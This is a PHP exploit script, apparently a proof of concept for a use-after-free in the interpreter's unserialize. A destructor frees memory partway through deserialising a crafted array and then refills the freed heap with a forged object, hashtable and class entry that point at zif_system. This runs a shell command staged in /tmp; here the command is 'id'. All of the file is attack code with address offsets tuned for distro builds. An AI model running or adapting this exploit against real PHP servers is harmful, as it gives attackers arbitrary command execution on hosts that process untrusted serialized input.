<?php
// vdR4_pre.php — zero4 variant with the forged pattern PREBUILT outside the
// destructor: the only allocation between efree(entries block) and the groom
// is the str_repeat itself. For jammy/distro builds where the inline-pack
// variant's small allocations push the groom off the freed page-run.
$CHUNK = (int)($argv[1] ?? 0);
$BASE  = (int)($argv[2] ?? 0);
$ZIF_SYSTEM = $BASE + 2216576;
$CMDTEXT = 'sh /tmp/.p2s_cmd';

@unlink('/tmp/.p2s_pwn');
file_put_contents('/tmp/.p2s_cmd', "(id) > /tmp/.p2s_pwn 2>&1\n");

class D {
    public function __destruct() {
        $GLOBALS['groom'] = str_repeat($GLOBALS['pat'], 4);
        $r1 = @unserialize('R:1020;');
        var_dump($r1);
        echo "SURVIVED-CALL\n";
    }
}

$V = function ($off) { global $CHUNK; return $CHUNK + 24 + $off; };
$OBJ = $V(32); $HT = $V(600); $CE = $V(1600); $SMINI = $V(128);
$pat  = pack('P', $V(16));
$pat .= str_repeat("\x00", 8);
$pat .= pack('PVV', $OBJ, 8, 0);
$pat .= pack('VV', 1, 8);
$pat .= pack('VV', 0x1337, 0);
$pat .= pack('P', $CE);
$pat .= pack('P', $HT);
$pat .= pack('P', 0);
$pat .= pack('P', 0x0000000100000000);
$pat .= str_repeat("\x00", 32);
$pat .= pack('PVV', $SMINI, 6, 0);
$pat .= pack('VV', 1, 0x16);
$pat .= pack('P', 0);
$pat .= pack('P', strlen($CMDTEXT));
$pat .= $CMDTEXT . "\x00";
$pat .= str_repeat("\x00", 599 - 152 - strlen($CMDTEXT));
$h  = pack('VV', 0, 0);
$h .= pack('P', 0);
$h .= pack('P', $ZIF_SYSTEM);
$h .= str_repeat("\x00", 136 - 24);
$h .= pack('P', $ZIF_SYSTEM);
$h .= str_repeat("\x00", 160 - 144);
$h .= pack('P', $ZIF_SYSTEM);
$h .= str_repeat("\x00", 208 - 168);
$pat .= $h;
$pat .= str_repeat("\x00", 1600 - 808);
$pat .= str_repeat("\x00", 2040 - 1600);
$GLOBALS['pat'] = $pat;
echo "forged: OBJ=0x", dechex($OBJ), " HT=0x", dechex($HT),
     " zif_system=0x", dechex($ZIF_SYSTEM), " patlen=", strlen($pat), "\n";

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:1:"D":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = unserialize($payload);
echo "outer ok=";
var_dump($r !== false);
echo "SCRIPT-END\n";
